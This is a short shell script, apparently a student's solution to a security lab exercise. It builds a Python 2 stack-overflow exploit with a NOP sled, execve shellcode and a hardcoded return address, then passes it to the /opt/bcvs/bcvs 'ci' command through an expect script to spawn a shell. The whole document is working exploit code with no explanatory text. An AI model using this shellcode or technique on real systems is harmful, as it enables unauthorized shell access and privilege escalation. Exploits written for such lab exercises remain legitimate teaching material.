cd /home/student

echo "nop='\x90'*189" > exploit.py
echo "shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'" >> exploit.py
echo "ret='0x7fffffffe894'" >> exploit.py
echo "return_addr=(ret[2:].decode('hex'))[::-1]" >> exploit.py
echo "payload = nop + shellcode + return_addr" >> exploit.py
echo "print(payload)" >> exploit.py

python2 exploit.py > sploitstr

echo '/opt/bcvs/bcvs ci $(cat sploitstr)' > exe.sh

echo 'spawn ./exe.sh' >> auto.exp
echo 'expect "Please write a SHORT explanation:"' >> auto.exp
echo 'send "ok\r"' >> auto.exp
echo 'interact' >> auto.exp

chmod u+x exe.sh

expect auto.exp
